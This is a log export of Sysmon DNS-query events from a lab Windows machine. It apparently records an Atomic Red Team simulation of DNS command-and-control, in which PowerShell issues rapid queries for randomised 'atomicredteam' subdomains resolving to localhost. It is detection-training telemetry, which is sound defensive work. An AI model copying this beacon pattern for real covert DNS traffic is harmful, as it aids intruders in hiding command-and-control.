"2025-12-22 13:58:03.746 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165434,"Query: atomicredteam-22094.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.611","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.746 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165435,"Query: atomicredteam-710445.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.653","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.747 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165436,"Query: atomicredteam-486048.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.693","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165437,"Query: atomicredteam-775424.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.736","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165438,"Query: atomicredteam-582109.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.781","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165439,"Query: atomicredteam-427228.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.822","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165440,"Query: atomicredteam-866328.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.140","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165441,"Query: atomicredteam-71313.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.184","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165442,"Query: atomicredteam-55033.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.236","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165443,"Query: atomicredteam-500348.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.279","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.752 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165444,"Query: atomicredteam-95411.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.324","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.752 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165445,"Query: atomicredteam-602694.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.368","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.752 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165446,"Query: atomicredteam-607249.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.550","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:04.752 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165447,"Query: atomicredteam-750021.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.594","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165448,"Query: atomicredteam-824121.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.638","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165449,"Query: atomicredteam-311137.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.682","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165450,"Query: atomicredteam-222530.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.725","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165451,"Query: atomicredteam-301392.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:04.908","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165452,"Query: atomicredteam-483079.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.078","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165453,"Query: atomicredteam-472643.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.399","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165454,"Query: atomicredteam-373806.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.439","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165455,"Query: atomicredteam-75955.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.478","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.760 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165456,"Query: atomicredteam-949526.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.522","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165457,"Query: atomicredteam-593439.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.565","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165458,"Query: atomicredteam-345454.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.609","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165459,"Query: atomicredteam-256453.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.653","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:05.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165460,"Query: atomicredteam-193172.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.699","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165461,"Query: atomicredteam-173379.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.744","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165462,"Query: atomicredteam-503589.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.789","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165463,"Query: atomicredteam-75876.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:05.835","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165464,"Query: atomicredteam-582154.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.006","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165465,"Query: atomicredteam-508480.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.048","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.769 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165466,"Query: atomicredteam-641526.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.091","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.769 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165467,"Query: atomicredteam-252475.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.132","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.769 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165468,"Query: atomicredteam-101631.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.173","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.769 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165469,"Query: atomicredteam-321105.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.212","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.769 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165470,"Query: atomicredteam-647122.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.253","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.769 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165471,"Query: atomicredteam-657068.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.294","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.769 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165472,"Query: atomicredteam-274635.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.334","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.769 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165473,"Query: atomicredteam-968199.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.376","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.770 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165474,"Query: atomicredteam-196591.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.415","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.770 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165475,"Query: atomicredteam-257113.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.457","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.770 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165476,"Query: atomicredteam-780339.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.497","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.770 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165477,"Query: atomicredteam-140880.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.539","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.770 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165478,"Query: atomicredteam-417977.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.582","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:06.770 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165479,"Query: atomicredteam-980477.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.626","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.772 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165480,"Query: atomicredteam-808219.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.669","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.772 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165481,"Query: atomicredteam-352257.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.713","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.772 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165482,"Query: atomicredteam-803767.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.757","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
